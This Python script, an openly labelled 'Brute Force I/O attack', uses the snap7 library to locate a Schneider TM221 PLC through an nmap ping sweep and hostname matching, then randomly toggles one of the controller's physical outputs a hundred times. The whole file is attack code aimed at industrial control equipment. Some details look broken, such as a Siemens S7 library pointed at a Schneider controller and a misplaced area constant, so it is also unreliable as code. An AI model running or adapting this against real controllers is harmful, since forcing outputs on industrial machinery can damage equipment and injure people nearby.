import snap7
import time
import random
import socket
import struct
import subprocess

# Configuration
PLC_MODEL = "TM221CE16R"  # Used for IP discovery (if needed)
TARGET_OUTPUT_ADDRESS = 0  # Example: Address of the output you want to manipulate (starts from 0)
TARGET_OUTPUT_AREA = snap7.util.S7AreaPA  # Area where the output resides. PA for outputs, PE for inputs, MK for Merkers, DB for data blocks
NUM_ATTEMPTS = 100         # Number of times to change the output value
DELAY_BETWEEN_ATTEMPTS = 0.1  # Seconds to wait between changes (adjust as needed)
BRUTE_FORCE_RANGE = [0, 1]    # Range of values to use for brute-forcing (0 for OFF, 1 for ON)
# OR  If you want to just flip a single bit
#BRUTE_FORCE_VALUE = 1 # Value to assign (e.g., toggle between 0 and 1 if that makes sense for your application)

# Function to discover the PLC's IP address (if unknown)
def discover_plc_ip(model_string):
    """
    Attempts to discover the IP address of a Schneider Electric PLC on the network.
    This is a VERY basic approach.  More robust methods like LLDP or reading
    the PLC's configuration file are preferable in real-world scenarios.

    Assumes a simple naming convention where the PLC's hostname includes the model.
    This is NOT a reliable method for a secure environment!

    Args:
        model_string: The model string of the PLC (e.g., "TM221CE16R")

    Returns:
        The IP address of the PLC as a string, or None if not found.
    """
    try:
        #Use nmap to discover devices
        nmap_output = subprocess.check_output(['nmap', '-sn', '192.168.1.0/24']).decode()

        # Parse nmap output for potential PLC IPs based on device naming
        potential_devices = []
        for line in nmap_output.splitlines():
            if 'Nmap scan report for' in line:
                ip = line.split(' ')[-1]  # Potential IP address
                potential_devices.append(ip)

        # Resolve hostname for each potential IP
        for ip in potential_devices:
            try:
                hostname, _, _ = socket.gethostbyaddr(ip)
                if model_string.lower() in hostname.lower():  # Case-insensitive matching
                    print(f"Found possible PLC at IP: {ip} based on hostname: {hostname}")
                    return ip
            except socket.herror:  # Hostname resolution failed
                pass

        print("No PLC found with the specified model in its hostname.")
        return None

    except subprocess.CalledProcessError as e:
        print(f"Error running nmap: {e}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during IP discovery: {e}")
        return None


def write_output_bit(client, area, byte_address, bit_number, value):
    """Writes a single bit to an output area in the PLC.

    Args:
        client: The snap7 client object.
        area: The snap7 area (e.g., snap7.util.S7AreaPA for outputs).
        byte_address: The byte address of the output.
        bit_number: The bit number within the byte (0-7).
        value: The value to write (0 or 1).
    """

    byte_array = client.read_area(area, 0, byte_address, 1) #read one byte
    snap7.util.set_bool(byte_array, 0, bit_number, value)
    client.write_area(area, 0, byte_address, byte_array)


def main():
    plc_ip = discover_plc_ip(PLC_MODEL)

    if not plc_ip:
        print("PLC IP address not found.  Exiting.")
        return

    print(f"Using PLC IP: {plc_ip}")

    client = snap7.client.Client()
    client.connect(plc_ip, 0, 2) # Rack 0, Slot 2.  Adjust if necessary

    if not client.get_connected():
        print("Failed to connect to the PLC.  Check IP address and PLC connectivity.")
        return


    try:
        print("Starting Brute Force I/O attack...")
        for i in range(NUM_ATTEMPTS):
            # Randomly choose a value from the allowed range
            output_value = random.choice(BRUTE_FORCE_RANGE)

            # OR: If you're just flipping a single bit:
            #output_value = 1 - output_value  # Toggle between 0 and 1
            #print(f"Attempt {i+1}: Setting output {TARGET_OUTPUT_ADDRESS} to {output_value}")
            write_output_bit(client, TARGET_OUTPUT_AREA, TARGET_OUTPUT_ADDRESS // 8, TARGET_OUTPUT_ADDRESS % 8, output_value)
            print(f"Attempt {i+1}: Setting output {TARGET_OUTPUT_ADDRESS} to {output_value}")
            time.sleep(DELAY_BETWEEN_ATTEMPTS) # Wait before the next attempt

        print("Brute Force I/O attack complete.")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        client.disconnect()
        client.destroy()
        print("Disconnected from PLC.")

if __name__ == "__main__":
    main()